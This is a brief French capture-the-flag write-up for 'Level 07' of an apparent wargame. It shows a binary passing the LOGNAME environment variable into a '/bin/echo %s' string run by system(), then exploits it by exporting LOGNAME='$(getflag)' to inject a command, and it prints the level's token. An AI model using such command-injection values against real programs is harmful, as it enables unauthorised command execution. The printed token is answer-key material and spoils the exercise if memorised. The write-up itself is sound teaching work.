## **Level 07:**

On a un binaire qui choppe la valeur de la variable d’env `LOGNAME`, puis la passe en parametre a `asprintf` comme ceci:

`asprintf(str, "/bin/echo %s ", env);` (on a donc : `/bin/echo $LOGNAME`).

Ensuite, cette string est passée en paramètre à `system()`.

On change donc la variable `LOGNAME`: `export LOGNAME='$(getflag)'`

et on ré-execute le progamme. `system()` sera donc appellé avec `/bin/echo $(getflag)`

> Token : **fiumuikeil55xe9cu4dood66h**
